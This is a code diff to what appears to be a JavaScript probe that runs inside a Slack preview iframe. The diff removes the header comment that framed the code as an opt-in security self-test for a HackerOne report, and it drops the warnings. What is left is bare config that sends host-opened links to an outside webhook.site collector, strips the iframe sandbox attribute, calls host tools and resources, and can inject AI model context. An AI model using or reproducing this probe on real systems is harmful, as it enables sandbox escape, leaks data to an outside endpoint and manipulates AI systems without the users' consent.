@@ -1,22 +1,14 @@
-/*
- * round-2 active probe  (security research / self-test)
- * 목적: raw 프리뷰 내부에서 P()를 통과하는 메시지를 호스트로 보내
- *       "호스트가 실제로 행동하는가"와, MutationObserver 틈(속성/자식)을 측정.
- * 원칙: 데이터 반출 없음(ui/open-link만 '본인 COLLECTOR'로, 옵트인). 화면 출력.
- * 사용: VM + 던져도 되는 Slack 워크스페이스에서만. 결과는 HackerOne 보고용.
- */
 (function () {
   "use strict";
 
-  // ===== CONFIG: 본인 값/스위치로 바꾸세요 =====
-  var COLLECTOR = "https://webhook.site/162f25bb-fb72-4708-8022-39d06dbc6144"; // 본인이 로그를 볼 수 있는 엔드포인트로 교체
+  var COLLECTOR = "https://webhook.site/162f25bb-fb72-4708-8022-39d06dbc6144";
   var ENABLE = {
     openLink:    true,   // ui/open-link -> COLLECTOR (호스트가 링크를 여는지 = 네트워크/로그에 찍힘)
-    uiMessage:   false,  // ⚠️ 테스트 DM에 글이 올라올 수 있음. 확인 후 true
+    uiMessage:   false,  // 테스트 DM에 글 확인 후 true
     surfaceOpen: true,   // slack/surface-comment/open
     toolsCall:   true,   // tools/call (raw엔 핸들러 없을 수도)
     resources:   true,   // resources/list, resources/read
-    modelCtx:    false,  // ⚠️ ui/update-model-context (AI 컨텍스트 주입). 확인 후 true
+    modelCtx:    false,  // ui/update-model-context (AI 컨텍스트 주입). 확인 후 true
     sandboxAttr: true,   // 내 iframe sandbox 속성 제거가 먹히는지 (비파괴: 지웠다 복구)
     childAdd:    true     // proxy body에 자식 추가 → 옵저버가 되돌리는지 (대조군)
   };
